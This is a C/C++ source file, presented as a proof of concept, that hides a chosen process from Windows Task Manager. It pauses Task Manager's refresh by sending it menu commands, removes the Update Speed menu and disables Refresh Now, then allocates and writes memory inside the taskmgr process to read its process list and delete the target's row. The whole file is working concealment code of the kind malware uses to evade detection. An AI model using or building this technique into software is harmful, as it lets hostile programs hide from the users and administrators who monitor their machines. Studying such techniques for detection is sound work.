/*
 * PoC for hiding process from Windows Task Manager
 * Manipulates the graphic interface of taskmgr
 */

#include <stdio.h>
#include <windows.h>
#include <atlstr.h>
#include <commctrl.h>
#include <strsafe.h>

#pragma comment(lib, "USER32")

#define     MAIN_WINDOW         L"Task Manager"
#define     VIEW_MENU           2
#define     UPDATE_SUBMENU      1

// Menus related commands
#define     WM_COMMAND          0x0111
#define     MF_BYPOSITION       0x00000400L
#define     MF_GRAYED           0x00000001L

// Define colours
#define     RED_ERR             12
#define     GREEN_OK            10
#define     WHITE_DEFAULT       7

/* Functions declarations */
int GetListViewItem(HWND listView, int index, int subitem, wchar_t* buf);

BOOL CALLBACK findProcessList(HWND hwnd, LPARAM lParam);

void ErrorExit(LPTSTR lpszFunction);

void colorPrint(int colour, const wchar_t* format, ...);

/* Useful macros */
#define PRINT_ERR(msg, ...) colorPrint(RED_ERR, msg, ##__VA_ARGS__)
#define PRINT_OK(msg, ...) colorPrint(GREEN_OK, msg, ##__VA_ARGS__)

/* Some global vars */
HWND hProcsList;		    // Handle to the Processes ListView

int wmain(int argc, wchar_t* argv[]) {
	HWND hTaskMan;			// Handle to the Task Manager window
	HMENU hMenu;			// Handle to the menu bar
	HMENU hView;			// View menu
	HMENU hUpdate;			// Update Speed submenu
	int numProcs;			// Number of displayed processes
	int idx;
	LRESULT nRet;
	BOOL found = FALSE;
	char menuName[512] = { 0 };

	if (argc < 2) {
		PRINT_ERR(L"Program to hide not specified. Run as:\n\n%s calc.exe", argv[0]);
		return 1;
	}

	printf("-- Stage 0 --\n");
	printf("Find handles to necessary window elements\n");
	hTaskMan = FindWindow(NULL, MAIN_WINDOW);
	if (!hTaskMan) {
		ErrorExit(LPTSTR("Find Task Manager window"));
	}
	else {
		PRINT_OK(L"[*] Found Task Manager window with handle: %p\n", hTaskMan);
	}

	// Locate the process list
	EnumChildWindows(hTaskMan, findProcessList, NULL);

	printf("\n-- Stage 1 --\n");
	printf("Disable updates of the process list\n");
	hMenu = GetMenu(hTaskMan);
	if (!hMenu) {
		ErrorExit(LPTSTR("Get handle to the window menu"));
	}
	else {
		PRINT_OK(L"[*] Found the handle of the window menu: %p\n", hMenu);
	}

	hView = GetSubMenu(hMenu, VIEW_MENU);
	if (!hView) {
		ErrorExit(LPTSTR("Get handle to the View menu"));
	}
	else {
		PRINT_OK(L"[*] Found handle to the View menu: %p\n", hView);
	}

	nRet = GetMenuStringA(hView, 1, menuName, 256, MF_BYPOSITION);

	hUpdate = GetSubMenu(hView, UPDATE_SUBMENU);
	nRet = GetMenuStringA(hUpdate, 3, menuName, 256, MF_BYPOSITION);

	if (!hUpdate) {
		ErrorExit(LPTSTR("Get handle to Update submenu"));
	}
	else {
		PRINT_OK(L"[*] Found handle to the Update Speed submenu: %p\n", hUpdate);

		// Hint: OllyDBG shows human readable parameters for SendMessage!
		// View -> Update Speed -> Paused
		nRet = SendMessage(hTaskMan, WM_COMMAND, GetMenuItemID(hUpdate, 3), 0);

		if (nRet) {
			PRINT_ERR(L"[-] The application didn't process the message");
		}
		else {
			if (GetLastError() == 5) {
				PRINT_ERR(L"[-] Message blocked by UIPI and silently dropped!");
				return 1;
			}
			else {
				PRINT_OK(L"[+] Update Speed should be paused now!\n");
			}
		}

		nRet = RemoveMenu(hView, 1, MF_BYPOSITION);
		if (nRet) {
			PRINT_OK(L"[+] Update Speed menu detached\n");
		}
		else {
			ErrorExit(LPTSTR("RemoveUpdate Speed menu"));
		}

		EnableMenuItem(hMenu, GetMenuItemID(hView, 0), MF_GRAYED);
		PRINT_OK(L"[+] \"Refresh Now\" option disabled\n");
	}

	printf("\n-- Stage 2 --\n");
	printf("Hide a specific process\n");

	numProcs = SendMessage(hProcsList, LVM_GETITEMCOUNT, 0, 0);
	PRINT_OK(L"[+] Found %d displayed processes\n", numProcs);

	for (idx = 0; idx < numProcs; idx++)
	{
		wchar_t buf[512] = { 0 };
		GetListViewItem(hProcsList, idx, 0, buf);

		if (!wcscmp(buf, argv[1])) {
			found = TRUE;
			break;
		}
	}

	if (!found) {
		PRINT_ERR(L"[-] Process not found!\n");
		return 1;
	}

	nRet = SendMessage(hProcsList, LVM_DELETEITEM, idx, 0);
	if (!nRet) {
		ErrorExit(LPTSTR("Delete process from the list"));
	}
	else {
		PRINT_OK(L"[+] Done!\n");
	}
}

void colorPrint(int colour, const wchar_t *format, ...) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	
	va_list args;
	va_start(args, format);

	SetConsoleTextAttribute(hConsole, colour);
	vwprintf(format, args);
	SetConsoleTextAttribute(hConsole, WHITE_DEFAULT); // Revert to white on black
	va_end(args);
}

// The process list is the first SysListView32 element
// Second list is for the Services tab
BOOL CALLBACK findProcessList(HWND hwnd, LPARAM lParam) {
	char clsName[256];

	GetClassNameA(hwnd, clsName, 256);
	if (!strcmp(clsName, "SysListView32")) {
		printf("[*] Found child window class %s with handle: %p\n", clsName, hwnd);
		hProcsList = hwnd;
		return FALSE;    // Terminate the loop
	}

	return TRUE;
}

// "Reading items from another program's listview control is one giant hack"
int GetListViewItem(HWND listView, int index, int subitem, wchar_t* outBuf) {
	LVITEM lvi = { 0 }, * lviMem;
	LRESULT nRet;
	SIZE_T bytesWritten, bytesRead;
	wchar_t* text;
	unsigned long pid;
	HANDLE process;

	GetWindowThreadProcessId(listView, &pid);
	process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ |
		PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);

	lviMem = (LVITEM*)VirtualAllocEx(process, NULL, sizeof(LVITEM),
		MEM_COMMIT, PAGE_READWRITE);
	text = (wchar_t *)VirtualAllocEx(process, NULL, 1024, 
		MEM_COMMIT, PAGE_READWRITE);

	lvi.mask = LVIF_TEXT | LVIF_IMAGE | LVIF_PARAM | LVIF_STATE;
	lvi.iItem = index;
	lvi.iSubItem = subitem;
	lvi.cchTextMax = MAX_PATH;
	lvi.pszText = text;

	nRet = WriteProcessMemory(process, lviMem, &lvi, sizeof(LVITEM), &bytesWritten);
	if (!nRet) {
		ErrorExit(LPTSTR("Write process memory"));
	}

	PMEMORY_BASIC_INFORMATION pmbi = new MEMORY_BASIC_INFORMATION;
	VirtualQueryEx(process, (LPVOID)text, pmbi, sizeof(MEMORY_BASIC_INFORMATION));
	if(pmbi->AllocationProtect != PAGE_READWRITE) {
		ErrorExit(LPTSTR("Allocated emory flags"));
	}

	nRet = SendMessage(listView, LVM_GETITEM, 0, (LPARAM)(lviMem));
	if (!nRet) {
		ErrorExit(LPTSTR("Send message to process"));
	}

	nRet = ReadProcessMemory(process, text, outBuf, 1024, &bytesRead);
	if (!nRet) {
		ErrorExit(LPTSTR("Read process memory"));
	}
	wprintf(L"[*] Found process: %s\n", outBuf);

	VirtualFreeEx(process, lviMem, 0, MEM_RELEASE);
	VirtualFreeEx(process, text, 0, MEM_RELEASE);

	return 0;
}

void ErrorExit(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);

	SetConsoleTextAttribute(hConsole, RED_ERR);
	printf("Error: %s\n", lpDisplayBuf);
	SetConsoleTextAttribute(hConsole, WHITE_DEFAULT);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);

	ExitProcess(dw);
}
